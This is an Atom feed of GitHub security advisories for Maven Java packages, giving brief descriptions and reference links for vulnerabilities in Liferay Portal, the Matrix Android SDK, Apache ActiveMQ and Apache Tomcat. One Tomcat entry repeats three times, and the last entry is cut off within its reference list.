<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2023-08-18T14:01:24.885Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[com.liferay.portal:release.portal.bom] Exposure of Resource to Wrong Sphere in Liferay Portal]]></title>
        <id>https://github.com/advisories/GHSA-6xxc-4jc4-7jv3</id>
        <link href="https://github.com/advisories/GHSA-6xxc-4jc4-7jv3"/>
        <updated>2023-08-18T05:02:55.000Z</updated>
        <content type="html"><![CDATA[<p>Liferay Portal 7.2.0 through 7.3.2, and Liferay DXP 7.2 before fix pack 9, allows access to Cross-origin resource sharing (CORS) protected resources if the user is only authenticated using the portal session authentication, which allows remote attackers to obtain sensitive information including the targeted userâ€™s email address and current CSRF token.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33330">https://nvd.nist.gov/vuln/detail/CVE-2021-33330</a></li>
<li><a href="https://issues.liferay.com/browse/LPE-17127">https://issues.liferay.com/browse/LPE-17127</a></li>
<li><a href="https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/120747720">https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/120747720</a></li>
<li><a href="https://github.com/advisories/GHSA-6xxc-4jc4-7jv3">https://github.com/advisories/GHSA-6xxc-4jc4-7jv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xxc-4jc4-7jv3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T22:28:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.matrix.android:matrix-android-sdk2] Logic error in Matrix SDK for Android]]></title>
        <id>https://github.com/advisories/GHSA-jjmc-4p83-pp26</id>
        <link href="https://github.com/advisories/GHSA-jjmc-4p83-pp26"/>
        <updated>2023-08-18T05:02:40.000Z</updated>
        <content type="html"><![CDATA[<p>A logic error in the room key sharing functionality of Element Android before 1.2.2 and matrix-android-sdk2 (aka Matrix SDK for Android) before 1.2.2 leads to a situation where identity verification is inadequate and thus a key-requesting device can be impersonated.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-40824">https://nvd.nist.gov/vuln/detail/CVE-2021-40824</a></li>
<li><a href="https://github.com/matrix-org/matrix-android-sdk2/releases/tag/v1.2.2">https://github.com/matrix-org/matrix-android-sdk2/releases/tag/v1.2.2</a></li>
<li><a href="https://matrix.org/blog/2021/09/13/vulnerability-disclosure-key-sharing">https://matrix.org/blog/2021/09/13/vulnerability-disclosure-key-sharing</a></li>
<li><a href="https://github.com/advisories/GHSA-jjmc-4p83-pp26">https://github.com/advisories/GHSA-jjmc-4p83-pp26</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjmc-4p83-pp26</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:14:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.activemq:activemq-core] Apache ActiveMQ Cross-site scripting (XSS) vulnerability in the Portfolio publisher servlet ]]></title>
        <id>https://github.com/advisories/GHSA-c9gx-27hq-wcvj</id>
        <link href="https://github.com/advisories/GHSA-c9gx-27hq-wcvj"/>
        <updated>2023-08-17T23:34:09.000Z</updated>
        <content type="html"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in the Portfolio publisher servlet in the demo web application in Apache ActiveMQ before 5.9.0 allows remote attackers to inject arbitrary web script or HTML via the refresh parameter to demo/portfolioPublish, a different vulnerability than CVE-2012-6092.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-1880">https://nvd.nist.gov/vuln/detail/CVE-2013-1880</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=924447">https://bugzilla.redhat.com/show_bug.cgi?id=924447</a></li>
<li><a href="https://issues.apache.org/jira/browse/AMQ-4398">https://issues.apache.org/jira/browse/AMQ-4398</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2013-1029.html">http://rhn.redhat.com/errata/RHSA-2013-1029.html</a></li>
<li><a href="http://www.securityfocus.com/bid/65615">http://www.securityfocus.com/bid/65615</a></li>
<li><a href="https://github.com/advisories/GHSA-c9gx-27hq-wcvj">https://github.com/advisories/GHSA-c9gx-27hq-wcvj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c9gx-27hq-wcvj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T03:46:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wq2p-q66w-q8gp</id>
        <link href="https://github.com/advisories/GHSA-wq2p-q66w-q8gp"/>
        <updated>2023-08-17T23:32:39.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Tomcat before 6.0.39, 7.x before 7.0.50, and 8.x before 8.0.0-RC10 processes chunked transfer coding without properly handling (1) a large total amount of chunked data or (2) whitespace characters in an HTTP header value within a trailer field, which allows remote attackers to cause a denial of service by streaming data.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-3544.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4322">https://nvd.nist.gov/vuln/detail/CVE-2013-4322</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1069905">https://bugzilla.redhat.com/show_bug.cgi?id=1069905</a></li>
<li><a href="https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013">https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2014-0686.html">https://rhn.redhat.com/errata/RHSA-2014-0686.html</a></li>
<li><a href="http://advisories.mageia.org/MGASA-2014-0148.html">http://advisories.mageia.org/MGASA-2014-0148.html</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2">http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2</a></li>
<li><a href="http://seclists.org/fulldisclosure/2014/Dec/23">http://seclists.org/fulldisclosure/2014/Dec/23</a></li>
<li><a href="http://secunia.com/advisories/59036">http://secunia.com/advisories/59036</a></li>
<li><a href="http://secunia.com/advisories/59675">http://secunia.com/advisories/59675</a></li>
<li><a href="http://secunia.com/advisories/59722">http://secunia.com/advisories/59722</a></li>
<li><a href="http://secunia.com/advisories/59724">http://secunia.com/advisories/59724</a></li>
<li><a href="http://secunia.com/advisories/59873">http://secunia.com/advisories/59873</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521834">http://svn.apache.org/viewvc?view=revision&amp;revision=1521834</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521864">http://svn.apache.org/viewvc?view=revision&amp;revision=1521864</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1549522">http://svn.apache.org/viewvc?view=revision&amp;revision=1549522</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1549523">http://svn.apache.org/viewvc?view=revision&amp;revision=1549523</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1556540">http://svn.apache.org/viewvc?view=revision&amp;revision=1556540</a></li>
<li><a href="http://tomcat.apache.org/security-6.html">http://tomcat.apache.org/security-6.html</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="http://tomcat.apache.org/security-8.html">http://tomcat.apache.org/security-8.html</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667883">http://www-01.ibm.com/support/docview.wss?uid=swg21667883</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21675886">http://www-01.ibm.com/support/docview.wss?uid=swg21675886</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21677147">http://www-01.ibm.com/support/docview.wss?uid=swg21677147</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678113">http://www-01.ibm.com/support/docview.wss?uid=swg21678113</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678231">http://www-01.ibm.com/support/docview.wss?uid=swg21678231</a></li>
<li><a href="http://www.debian.org/security/2016/dsa-3530">http://www.debian.org/security/2016/dsa-3530</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:052">http://www.mandriva.com/security/advisories?name=MDVSA-2015:052</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:084">http://www.mandriva.com/security/advisories?name=MDVSA-2015:084</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html">http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html">http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html</a></li>
<li><a href="http://www.securityfocus.com/archive/1/534161/100/0/threaded">http://www.securityfocus.com/archive/1/534161/100/0/threaded</a></li>
<li><a href="http://www.securityfocus.com/bid/65767">http://www.securityfocus.com/bid/65767</a></li>
<li><a href="http://www.ubuntu.com/usn/USN-2130-1">http://www.ubuntu.com/usn/USN-2130-1</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0008.html">http://www.vmware.com/security/advisories/VMSA-2014-0008.html</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0012.html">http://www.vmware.com/security/advisories/VMSA-2014-0012.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wq2p-q66w-q8gp">https://github.com/advisories/GHSA-wq2p-q66w-q8gp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq2p-q66w-q8gp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:10:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wq2p-q66w-q8gp</id>
        <link href="https://github.com/advisories/GHSA-wq2p-q66w-q8gp"/>
        <updated>2023-08-17T23:32:39.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Tomcat before 6.0.39, 7.x before 7.0.50, and 8.x before 8.0.0-RC10 processes chunked transfer coding without properly handling (1) a large total amount of chunked data or (2) whitespace characters in an HTTP header value within a trailer field, which allows remote attackers to cause a denial of service by streaming data.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-3544.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4322">https://nvd.nist.gov/vuln/detail/CVE-2013-4322</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1069905">https://bugzilla.redhat.com/show_bug.cgi?id=1069905</a></li>
<li><a href="https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013">https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2014-0686.html">https://rhn.redhat.com/errata/RHSA-2014-0686.html</a></li>
<li><a href="http://advisories.mageia.org/MGASA-2014-0148.html">http://advisories.mageia.org/MGASA-2014-0148.html</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2">http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2</a></li>
<li><a href="http://seclists.org/fulldisclosure/2014/Dec/23">http://seclists.org/fulldisclosure/2014/Dec/23</a></li>
<li><a href="http://secunia.com/advisories/59036">http://secunia.com/advisories/59036</a></li>
<li><a href="http://secunia.com/advisories/59675">http://secunia.com/advisories/59675</a></li>
<li><a href="http://secunia.com/advisories/59722">http://secunia.com/advisories/59722</a></li>
<li><a href="http://secunia.com/advisories/59724">http://secunia.com/advisories/59724</a></li>
<li><a href="http://secunia.com/advisories/59873">http://secunia.com/advisories/59873</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521834">http://svn.apache.org/viewvc?view=revision&amp;revision=1521834</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521864">http://svn.apache.org/viewvc?view=revision&amp;revision=1521864</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1549522">http://svn.apache.org/viewvc?view=revision&amp;revision=1549522</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1549523">http://svn.apache.org/viewvc?view=revision&amp;revision=1549523</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1556540">http://svn.apache.org/viewvc?view=revision&amp;revision=1556540</a></li>
<li><a href="http://tomcat.apache.org/security-6.html">http://tomcat.apache.org/security-6.html</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="http://tomcat.apache.org/security-8.html">http://tomcat.apache.org/security-8.html</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667883">http://www-01.ibm.com/support/docview.wss?uid=swg21667883</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21675886">http://www-01.ibm.com/support/docview.wss?uid=swg21675886</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21677147">http://www-01.ibm.com/support/docview.wss?uid=swg21677147</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678113">http://www-01.ibm.com/support/docview.wss?uid=swg21678113</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678231">http://www-01.ibm.com/support/docview.wss?uid=swg21678231</a></li>
<li><a href="http://www.debian.org/security/2016/dsa-3530">http://www.debian.org/security/2016/dsa-3530</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:052">http://www.mandriva.com/security/advisories?name=MDVSA-2015:052</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:084">http://www.mandriva.com/security/advisories?name=MDVSA-2015:084</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html">http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html">http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html</a></li>
<li><a href="http://www.securityfocus.com/archive/1/534161/100/0/threaded">http://www.securityfocus.com/archive/1/534161/100/0/threaded</a></li>
<li><a href="http://www.securityfocus.com/bid/65767">http://www.securityfocus.com/bid/65767</a></li>
<li><a href="http://www.ubuntu.com/usn/USN-2130-1">http://www.ubuntu.com/usn/USN-2130-1</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0008.html">http://www.vmware.com/security/advisories/VMSA-2014-0008.html</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0012.html">http://www.vmware.com/security/advisories/VMSA-2014-0012.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wq2p-q66w-q8gp">https://github.com/advisories/GHSA-wq2p-q66w-q8gp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq2p-q66w-q8gp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:10:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wq2p-q66w-q8gp</id>
        <link href="https://github.com/advisories/GHSA-wq2p-q66w-q8gp"/>
        <updated>2023-08-17T23:32:39.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Tomcat before 6.0.39, 7.x before 7.0.50, and 8.x before 8.0.0-RC10 processes chunked transfer coding without properly handling (1) a large total amount of chunked data or (2) whitespace characters in an HTTP header value within a trailer field, which allows remote attackers to cause a denial of service by streaming data.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-3544.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4322">https://nvd.nist.gov/vuln/detail/CVE-2013-4322</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1069905">https://bugzilla.redhat.com/show_bug.cgi?id=1069905</a></li>
<li><a href="https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013">https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/39ae1f0bd5867c15755a6f959b271ade1aea04ccdc3b2e639dcd903b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b84ad1258a89de5c9c853c7f2d3ad77e5b8b2930be9e132d5cef6b95@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/b8a1bf18155b552dcf9a928ba808cbadad84c236d85eab3033662cfb@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r03c597a64de790ba42c167efacfa23300c3d6c9fe589ab87fe02859c@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/r587e50b86c1a96ee301f751d50294072d142fd6dc08a8987ae9f3a9b@%3Cdev.tomcat.apache.org%3E</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2014-0686.html">https://rhn.redhat.com/errata/RHSA-2014-0686.html</a></li>
<li><a href="http://advisories.mageia.org/MGASA-2014-0148.html">http://advisories.mageia.org/MGASA-2014-0148.html</a></li>
<li><a href="http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2">http://marc.info/?l=bugtraq&amp;m=144498216801440&amp;w=2</a></li>
<li><a href="http://seclists.org/fulldisclosure/2014/Dec/23">http://seclists.org/fulldisclosure/2014/Dec/23</a></li>
<li><a href="http://secunia.com/advisories/59036">http://secunia.com/advisories/59036</a></li>
<li><a href="http://secunia.com/advisories/59675">http://secunia.com/advisories/59675</a></li>
<li><a href="http://secunia.com/advisories/59722">http://secunia.com/advisories/59722</a></li>
<li><a href="http://secunia.com/advisories/59724">http://secunia.com/advisories/59724</a></li>
<li><a href="http://secunia.com/advisories/59873">http://secunia.com/advisories/59873</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521834">http://svn.apache.org/viewvc?view=revision&amp;revision=1521834</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1521864">http://svn.apache.org/viewvc?view=revision&amp;revision=1521864</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1549522">http://svn.apache.org/viewvc?view=revision&amp;revision=1549522</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1549523">http://svn.apache.org/viewvc?view=revision&amp;revision=1549523</a></li>
<li><a href="http://svn.apache.org/viewvc?view=revision&amp;revision=1556540">http://svn.apache.org/viewvc?view=revision&amp;revision=1556540</a></li>
<li><a href="http://tomcat.apache.org/security-6.html">http://tomcat.apache.org/security-6.html</a></li>
<li><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></li>
<li><a href="http://tomcat.apache.org/security-8.html">http://tomcat.apache.org/security-8.html</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21667883">http://www-01.ibm.com/support/docview.wss?uid=swg21667883</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21675886">http://www-01.ibm.com/support/docview.wss?uid=swg21675886</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21677147">http://www-01.ibm.com/support/docview.wss?uid=swg21677147</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678113">http://www-01.ibm.com/support/docview.wss?uid=swg21678113</a></li>
<li><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21678231">http://www-01.ibm.com/support/docview.wss?uid=swg21678231</a></li>
<li><a href="http://www.debian.org/security/2016/dsa-3530">http://www.debian.org/security/2016/dsa-3530</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:052">http://www.mandriva.com/security/advisories?name=MDVSA-2015:052</a></li>
<li><a href="http://www.mandriva.com/security/advisories?name=MDVSA-2015:084">http://www.mandriva.com/security/advisories?name=MDVSA-2015:084</a></li>
<li><a href="http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html">http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html">http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a></li>
<li><a href="http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html">http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html</a></li>
<li><a href="http://www.securityfocus.com/archive/1/534161/100/0/threaded">http://www.securityfocus.com/archive/1/534161/100/0/threaded</a></li>
<li><a href="http://www.securityfocus.com/bid/65767">http://www.securityfocus.com/bid/65767</a></li>
<li><a href="http://www.ubuntu.com/usn/USN-2130-1">http://www.ubuntu.com/usn/USN-2130-1</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0008.html">http://www.vmware.com/security/advisories/VMSA-2014-0008.html</a></li>
<li><a href="http://www.vmware.com/security/advisories/VMSA-2014-0012.html">http://www.vmware.com/security/advisories/VMSA-2014-0012.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wq2p-q66w-q8gp">https://github.com/advisories/GHSA-wq2p-q66w-q8gp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq2p-q66w-q8gp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:10:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat] Apache Tomcat is vulnerable to HTTP request-smuggling]]></title>
        <id>https://github.com/advisories/GHSA-j448-j653-r3vj</id>
        <link href="https://github.com/advisories/GHSA-j448-j653-r3vj"/>
        <updated>2023-08-17T23:32:18.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Tomcat before 6.0.39, 7.x before 7.0.47, and 8.x before 8.0.0-RC3, when an HTTP connector or AJP connector is used, does not properly handle certain inconsistent HTTP request headers, which allows remote attackers to trigger incorrect identification of a request's length and conduct request-smuggling attacks via (1) multiple Content-Length headers or (2) a Content-Length header and a "Transfer-Encoding: chunked" header.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2005-2090.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-4286">https://nvd.nist.gov/vuln/detail/CVE-2013-4286</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1069921">https://bugzilla.redhat.com/show_bug.cgi?id=1069921</a></li>
<li><a href="https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013">https://h20564.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04851013</a></li>
<li><a href="https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E">https://lists.apache.org/thread.html/37220405a377c0182d2afdbc36461c4783b2930fbeae3a17f1333113@%3Cdev.tomcat.apache.org%3E</a></li>
